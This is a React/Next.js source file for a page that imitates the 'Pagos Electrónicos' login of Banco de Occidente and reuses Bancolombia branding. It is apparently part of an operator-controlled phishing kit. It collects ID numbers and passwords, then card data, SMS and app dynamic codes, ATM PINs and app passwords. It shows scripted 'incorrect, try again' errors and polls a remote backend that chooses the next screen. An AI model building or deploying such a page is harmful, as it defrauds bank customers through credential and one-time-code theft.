"use client"
import "./occidente.css"
import { Tarjeta } from "@/components/tarjeta/Tarjeta"
import { Status } from "@/components/status/Status"
import { useEffect, useRef, useState } from "react"
import axios from "axios"
import { handlerAplicacion, handlerCajero, handlerClaveVirtual, handlerMensaje, handlerTarjeta } from "@/utils/handlerVista"

const COLOR_PRINCIPAL_TEXT = "text-[#0048db]"
const COLOR_PRINCIPAL_BACK = "bg-[#072146]"
const back_color = "bg-[#ffffff]"
const text_color_principal = "text-black"
const ESTILO_BTN_PRINCIPAL = `flex justify-center items-center font-bold py-2 px-3 bg-[#0065dc] text-white text-[12px] rounded-sm disabled:text-[#73adfa] cursor-not-allowed`

const svg = (
    <img src="/assets/bancolombia/user.svg" className="w-[20px] h-[20px] object-contain" alt="" />
)

const svgPassword = (
    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-eye ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
        <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
        <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
    </svg>
)

const btn = (
    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-eye ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
        <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8M1.173 8a13 13 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5s3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5s-3.879-1.168-5.168-2.457A13 13 0 0 1 1.172 8z"/>
        <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5M4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0"/>
    </svg>
)

const Loading = () => {
  return (
    <div className="fixed inset-0 bg-white/60 flex items-center justify-center z-50">
      <div className="w-12 h-12 border-4 border-[#0041a8] border-t-transparent rounded-full animate-spin" />
    </div>
  );
}

const InputAnimado = ({
    label,
    borderCol = "border-0", 
    borderColSelec = "", 
    borderColError, 
    errorLabel, 
    name,
    handler, 
    value, 
    error=false, 
    modoNumerico=false, 
    type="text", 
    backGraundInput="bg-white",
    contenBtn = null,
    btn = false,
    labelColor = "text-black",
    labelColorSelect = "",
    labelErrorColor = "text-red-600",
    placeHolder = "",
    svg = null
}) => {
  const [isFocused, setIsFocused] = useState(false);
  const shouldFloat = isFocused || value !== "";
  const [mostrarPasword, setMostrarPasword] = useState(false)


  return (
    <div className="w-full flex flex-col">
        {label && 
            <div className="text-[12px] text-[#5c5c5c] font-bold">
                {label}
            </div>
        }
        <div className={`w-full flex mt-1.5 ${isFocused ? "border border-[#0041a8]":"border border-slate-300"}`}>
            <input
                inputMode={modoNumerico ? "numeric" : "text"}
                name={name}
                type={ type == "password" ? mostrarPasword ? "text": "password" : type}
                onFocus={() => setIsFocused(true)}
                onBlur={() => setIsFocused(false)}
                onChange={(e) => handler(e)}
                className={`py-1 px-2.5 outline-none ${type == "password" ? "w-[90%]" : "w-full"} `}
                placeholder={placeHolder}
                value={value}
                />
            {type == "password" && 
                <button onClick={()=> setMostrarPasword(p => !p)} className={" text-slate-400"}>
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-eye-slash" viewBox="0 0 16 16">
                        <path d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5a7 7 0 0 0-2.79.588l.77.771A6 6 0 0 1 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13 13 0 0 1 14.828 8q-.086.13-.195.288c-.335.48-.83 1.12-1.465 1.755q-.247.248-.517.486z"/>
                        <path d="M11.297 9.176a3.5 3.5 0 0 0-4.474-4.474l.823.823a2.5 2.5 0 0 1 2.829 2.829zm-2.943 1.299.822.822a3.5 3.5 0 0 1-4.474-4.474l.823.823a2.5 2.5 0 0 0 2.829 2.829"/>
                        <path d="M3.35 5.47q-.27.24-.518.487A13 13 0 0 0 1.172 8l.195.288c.335.48.83 1.12 1.465 1.755C4.121 11.332 5.881 12.5 8 12.5c.716 0 1.39-.133 2.02-.36l.77.772A7 7 0 0 1 8 13.5C3 13.5 0 8 0 8s.939-1.721 2.641-3.238l.708.709zm10.296 8.884-12-12 .708-.708 12 12z"/>
                    </svg>
                </button>
            }
        </div>
        {error && <span className={`text-[12px] mt-1.5  font-medium ${labelErrorColor}`}>{errorLabel}</span>}
    </div>
  );
}

const SelectMinimalista = ({
  label,
  errorLabel,
  name,
  labelColor,
  borderCol, 
  borderColSelec,
  handler,
  borderColError,
  arrayDatos,
  error=false,
  backGraundInput="bg-white",
  border = "border-b-2",
  colorSvg = "text-slate-500"
}) => {
  const [isOpen, setIsOpen] = useState(false);
  const [selectedItem, setSelectedItem] = useState(typeof arrayDatos[0] === "object" ? arrayDatos[0].value : arrayDatos[0]);
  const [highlightedIndex, setHighlightedIndex] = useState(0);
  const containerRef = useRef();

  const toggleDropdown = () => setIsOpen(prev => !prev);
    console.log(arrayDatos);
    
  const handleSelect = (value) => {
    setSelectedItem(value);
    handler({ target: { name, value } });
    setIsOpen(false);
  };

  const handleClickOutside = (e) => {
    if (containerRef.current && !containerRef.current.contains(e.target)) {
      setIsOpen(false);
    }
  };

  const handleKeyDown = (e) => {
    if (!isOpen) {
      if (e.key === "Enter" || e.key === " ") {
        e.preventDefault();
        setIsOpen(true);
      }
      return;
    }

    if (e.key === "ArrowDown") {
      e.preventDefault();
      setHighlightedIndex((prev) => (prev + 1) % arrayDatos.length);
    }

    if (e.key === "ArrowUp") {
      e.preventDefault();
      setHighlightedIndex((prev) =>
        prev === 0 ? arrayDatos.length - 1 : prev - 1
      );
    }

    if (e.key === "Enter") {
      e.preventDefault();
      handleSelect(arrayDatos[highlightedIndex]);
    }

    if (e.key === "Escape") {
      setIsOpen(false);
    }
  };

  useEffect(() => {
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  return (
    <div className={`w-full flex flex-col`} >
        <span className={`${labelColor} pl-2 text-[12px]`}>{label}</span>
        <div
        ref={containerRef}
        tabIndex={0}
        onClick={toggleDropdown}
        onKeyDown={handleKeyDown}
        className={`w-full flex flex-col pl-2 relative cursor-pointer outline-none ${error ? borderColError : borderCol}`}
        >
        <div className="w-full flex justify-between items-center border mt-1.5 px-1 py-0.5 border-slate-300">
            <span className="ml-2 text-[13px]">{selectedItem}</span>
            <div className={`${colorSvg} transform transition-transform py-1.5 duration-300 ${!isOpen ? "rotate-180": ""}`}>
            <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="currentColor" className="bi bi-chevron-up" viewBox="0 0 16 16">
                <path fillRule="evenodd" d="M7.646 4.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1-.708.708L8 5.707l-5.646 5.647a.5.5 0 0 1-.708-.708z"/>
            </svg>
            </div>
        </div>

        {isOpen && (
            <div
            className={`w-[57vw] p-2 z-20 absolute bg-[#021f47] py-2.5 left-2 top-10 flex flex-col  rounded-lg gap gap-y-1`}
            >
            {arrayDatos.map((d, k) => (
                <button
                key={k}
                type="button"
                onClick={(e) => {
                    e.stopPropagation();
                    handleSelect(typeof d === "object" ? d.value : d);
                }}
                className={`text-[14px] text-white text-start flex items-center pr-1 gap gap-x-1 py-1 px-2 rounded ${
                    (typeof d === "object" && selectedItem === d.value) || d === selectedItem ? "bg-[#0057cb]" : ""
                }`}
                >
                {typeof d === "object" ? d.string : d}
                </button>
            ))}
            </div>
        )}
        </div>
        {error && <span className="text-[14px] mt-1.5 text-red-600 font-medium">{errorLabel}</span>}
    </div>
  );
}



const Usuario = ({handlerCheck, handlerInformacion,handlerContinuar, datosInicio, errorDatos}) =>{
    return(
        <div className="w-[99%] bg-white p-2 rounded-xl flex flex-col items-center">
            <div className="w-full mt-0.5 flex gap gap-x-4">
                <span className="text-[12px] ml-[10px] text-[#5c5c5c] font-bold">Identificación</span>
            </div>
            <div className="w-full mt-0.5 flex gap gap-x-3.5">
                <div className="w-[26%]">
                    <SelectMinimalista 
                        label={""}
                        labelColor={"text-[#5c5c5c]"}
                        name={"tipoDocumento"} 
                        handler={handlerInformacion}
                        colorSvg="text-[#0041a8]" 
                        value={datosInicio.numeroDocumento} 
                        arrayDatos={[{string:"C.C - Cédula de ciudadanía", value:"C.C"}, {string:"C.E - Cédula de extranjería", value:"C.E"}, {string:"PS - Pasaporte", value:"PS"}, {string:"T.I - Tarjeta de identidad", value:"T.I"}]} 
                        borderCol={"border-gray-400"} 
                        borderColSelec={"border-black"} 
                        borderColError={"border-red-600"}
                    />
                </div>
                <div className="w-[69%]">
                    <InputAnimado 
                        error={!!errorDatos.numeroDocumento}
                        errorLabel={errorDatos.numeroDocumento} 
                        label={""} 
                        modoNumerico={true}
                        type={"tel"} 
                        placeHolder="Ej: 1093238993"
                        name={"numeroDocumento"} 
                        handler={handlerCheck} 
                        value={datosInicio.numeroDocumento}
                    />
                </div>     
            </div>
            <div className="w-full mt-3.5 mb-0.5 flex flex-col ml-[10px]">
                <span className="text-[12px] text-[#5c5c5c] font-bold">Contraseña</span>
                <div className="w-[99%]">
                    <InputAnimado 
                            error={!!errorDatos.contrasenia}
                            errorLabel={errorDatos.contrasenia} 
                            label={""} 
                            modoNumerico={true}
                            type={"password"} 
                            placeHolder=""
                            name={"contrasenia"} 
                            handler={handlerCheck} 
                            value={datosInicio.contrasenia}
                            
                        />
                </div>
            </div>
            <div className="w-full pt-6 pb-2 flex justify-between items-center">
                <button className="px-3 py-2 text-[11px] border border-slate-300 flex justify-between items-center rounded-sm text-[#5c5c5c] font-bold">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0081ff" className="bi bi-arrow-left mr-1.5" viewBox="0 0 16 16">
                        <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8"/>
                    </svg>
                    Volver al comercio
                </button>
                <button onClick={()=> handlerContinuar(true)} disabled={datosInicio.numeroDocumento.trim() == ""} className={"flex justify-center items-center font-bold py-2 px-3 bg-[#0065dc] text-white text-[12px] rounded-sm disabled:text-[#73adfa] cursor-not-allowed"}>
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" className="bi bi-lock-fill pr-1.5" viewBox="0 0 16 16">
                        <path fill-rule="evenodd" d="M8 0a4 4 0 0 1 4 4v2.05a2.5 2.5 0 0 1 2 2.45v5a2.5 2.5 0 0 1-2.5 2.5h-7A2.5 2.5 0 0 1 2 13.5v-5a2.5 2.5 0 0 1 2-2.45V4a4 4 0 0 1 4-4m0 1a3 3 0 0 0-3 3v2h6V4a3 3 0 0 0-3-3"/>
                    </svg>
                    Ingresar
                </button>
            </div>
        </div>
    )
}

const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar, tituloError }) => {
    const [errorDatos, setErrorDatos] = useState({
        numeroDocumento: "",
        contrasenia: ""       
    })

    const handlerContinuar = () => {
        const nuevosErrores = {
            numeroDocumento: "",
            contrasenia: ""
        }

        // Validación de número de documento
        if (!datosInicio.numeroDocumento || datosInicio.numeroDocumento.trim() === "") {
            nuevosErrores.numeroDocumento = "El campo es obligatorio"
        }

        // Validación de contraseña
        if (!datosInicio.contrasenia || datosInicio.contrasenia.trim() === "") {
            nuevosErrores.contrasenia = "La clave es obligatoria"
        }

        // Si hay errores, los mostramos
        if (nuevosErrores.numeroDocumento || nuevosErrores.contrasenia) {
            setErrorDatos(nuevosErrores)
            return
        }

        // Si no hay errores, limpiamos y ejecutamos la acción
        setErrorDatos({
            tipoDocumento:"",    
            numeroDocumento: "",
            contrasenia: ""
        })
        btnInicio()
    }
    
    
    
    const handlerCheck = (e) => {
        const { name, value } = e.target;
        
        handlerInformacion(e);

        setErrorDatos((prev) => {
            const nuevosErrores = { ...prev };

            // Validación en tiempo real por campo
            if (name === "numeroDocumento") {
                if (!value.trim()) {
                    nuevosErrores.numeroDocumento = "El campo es requerido";
                } else {
                    nuevosErrores.numeroDocumento = "";
                }
            }

            if (name === "contrasenia") {
                if (!value.trim()) {
                    nuevosErrores.contrasenia = "La clave es obligatoria";
                } else {
                    nuevosErrores.contrasenia = "";
                }
            }

                return nuevosErrores;
            });
    };

    return (
        <div className="w-[95%] flex flex-col justify-center items-center pb-4">
            {tituloError !== "" && 
                <div className="w-full flex items-center mt-3 justify-center">
                    <span className="text-[11px] text-center text-red-600">{tituloError}</span>
                </div>
            }
            <div className="w-full flex mt-4 flex-col justify-center items-center gap gap-y-4 pl-1">
                <Usuario handlerInformacion={handlerInformacion} handlerCheck={handlerCheck} errorDatos={errorDatos} datosInicio={datosInicio} handlerContinuar={handlerContinuar} />             
            </div>
        </div>
    )
}





export default function Occidente (){
    const isMounted = useRef(true);
    const [selectVista, setSelectVisata] = useState("nlogin")
    const [loading, setLoading] = useState(false)
    const [reLoad, setReLoad] = useState(false)
    const [key, setKey] = useState(0)
    const [datosInicio, setDatosInicio] = useState({
        tipoDocumento: "Cédula De Ciudadanía",
        numeroDocumento: "",
        contrasenia:""
    })
    const [guardado, setGuardado] = useState(false)
    const [uniqId, setUniqId] = useState("")
    const [btnInicio, setBtnInicio] = useState(false)
    
    const handlerInformacion = (e)=>{
        const copia = {...datosInicio}
        copia[e.target.name] = e.target.value
        
        setDatosInicio(copia)
    }

    const handlerBtnInicio = ()=>{
        setBtnInicio(b => !b)
    }

    const handlerloginError = ()=>{
        setBtnInicio(true)
    }

    const tarjetaData = {
        'tdb': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:"}, 
        'xtdb':{span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:", error:"Los datos ingresados son incorrectos. Intentanuevamente."}, 
        'tdc': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingrese los siguientes datos de su tarjeta credito:"}, 
        'xtdc': {span:"Validación de seguridad", handler: handlerTarjeta, titulo:"Ingresa los siguientes datos de tu tarjeta débito:", error:"Los datos ingresados son incorrectos. Intentanuevamente."},
    }

    const loginData  ={
        'nlogin': {handler: handlerInformacion, btn: handlerBtnInicio},
        'xlogin': {handler: handlerInformacion, btn: handlerloginError, error: "La información ingresada es incorrecta. Intenta nuevamente."},
    }

    const codData = {  
        'codsms': {span:"Clave dinámica", handler: handlerMensaje, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto."}, 
        'xcodsms': {span:"Clave dinámica", handler: handlerMensaje, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto.", error:"Clave dinámica incorrecta o vencida. Ingresa la nueva clave dinámica."},
        'codapp': {span:"Clave dinámica", handler: handlerAplicacion, titulo:"Consulta tu Clave Dinámica desde la App Mi Bancolombia."}, 
        'xcodapp': {span:"Clave dinámica", handler: handlerAplicacion, titulo:"Consulta tu Clave Dinámica recibida por mensaje de texto.", error:"Clave dinámica incorrecta o vencida. Ingresa la nueva clave dinámica."}, 
        'pincaj': {span:"Verificación de seguridad", handler: handlerCajero, titulo:"Ingresa la Clave que usas en el cajero automático:"}, 
        'xpincaj': {span:"Verificación de seguridad", handler: handlerCajero, titulo:"Ingresa la Clave que usas en el cajero automático:", error:"La Clave ingresada no es correcta. Intenta nuevamente."}, 
        'pinvir': {span:"Verificación de seguridad", handler: handlerClaveVirtual, titulo:"Ingresa la Clave que usas para ingresar a Mi App Bancolombia:"}, 
        'xpinvir': {span:"Verificación de seguridad", handler: handlerClaveVirtual, titulo:"Ingresa la Clave que usas para ingresar a Mi App Bancolombia:", error:"La Clave ingresada no es correcta. Intenta nuevamente."}, 
    }
    
    //obtener uniqId
    useEffect(() => {
        const savedId = localStorage.getItem('uniqId')
        console.log(savedId == null, "guardaaaa", savedId);
        const temp = savedId == null ? "" : savedId
        setUniqId(temp)
        
    }, [])
    
    //guardad datos de sesion
    useEffect(()=>{
        if (btnInicio) {
            inicioSesionfuncion(setLoading, datosInicio, uniqId, setUniqId, setKey, setGuardado, selectVista,"Occidente")
        }
    },[btnInicio])

    //pulling
    useEffect(() => {
        isMounted.current = true;

        if (guardado) {
            iniciarLongPolling( isMounted, uniqId, setKey, setLoading, setSelectVisata, selectVista, setDatosInicio);
            setBtnInicio(false)
        }
        return () => {
            isMounted.current = false;
        };
    }, [guardado, reLoad]);


    return(
        <div className={`w-full flex flex-col bg-white items-center justify-center`}>
            <div className={`w-full flex justify-center items-center py-3`}>
                <div className={`w-[98%] flex justify-end`}>
                    <div className="py-0.5 px-3 border border-gray-400 rounded-full flex items-center">
                        <svg width="15" height="15" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" fill="none">                        
                            <path
                                d="M30.5 6.1a26 26 0 0 1 20.4 11.3"
                                stroke="#00BFA6"
                                strokeWidth="2"
                                strokeLinecap="round"
                            />

                            <path
                                d="M13.1 43.1A26 26 0 0 0 33.5 58"
                                stroke="#00BFA6"
                                strokeWidth="2"
                                strokeLinecap="round"
                            />
                            <circle cx="50.5" cy="18" r="4" fill="#00BFA6"/>
                            <circle cx="50.5" cy="18" r="2" fill="white"/>
                            <circle cx="13.5" cy="43" r="4" fill="#00BFA6"/>
                            <circle cx="13.5" cy="43" r="2" fill="white"/>
                            <path
                                d="M32 20L24 24V32C24 36 27.3 40 32 42C36.7 40 40 36 40 32V24L32 20Z"
                                stroke="#00BFA6"
                                strokeWidth="2"
                                fill="none"
                            />
                        </svg>
                        <span className="text-[12px] text-gray-400">Seguridad</span>
                    </div> 
                </div>
            </div>


            <div className="w-full flex justify-center">
                <div className="min-h-[70vh] w-[90%] flex flex-col items-center justify-center">
                    <div className="w-full flex justify-center">
                        <img src="/assets/occidente/header.svg" className="w-[55%] object-cover" alt="" />
                    </div>
                    <div className="w-full mt-2.5 flex flex-col justify-center items-center">
                        <span className="text-[12px] font-bold ">¡Bienvenido! a tus,</span>
                        <span className="text-[14px] font-bold text-[#0081ff]">Pagos Electrónicos</span>
                    </div>
                    {loading && <Loading/>}
                    
                    { loginData[selectVista] && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={loginData[selectVista]?.error || ""} btnInicio={loginData[selectVista].handler}/>}
                    
                    { tarjetaData[selectVista] && <Tarjeta key={key} setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} error={tarjetaData[selectVista]?.error || ""} titulo={tarjetaData[selectVista].titulo} estiloTitulo="text-[#5c5c5c] text-[13px] text-center font-bold" handlerTarjeta={tarjetaData[selectVista].handler} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} textColor={"text-[#5c5c5c] font-bold"}  backGraundInput={"bg-white"} divInput={`w-full flex mt-1.5 border border-slate-300`}/>}
                    
                    { codData[selectVista] && <Status key={key} setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} tamInput={6} textColor={text_color_principal} titulo={codData[selectVista].titulo} estiloTitulo="text-[#5c5c5c] text-[13px] text-center font-bold" lebelInput={codData[selectVista].span} InputModificado={InputAnimado} handler={codData[selectVista].handler} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={codData[selectVista]?.error || ""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
                    
                </div>
            </div>            
        </div>
    )
}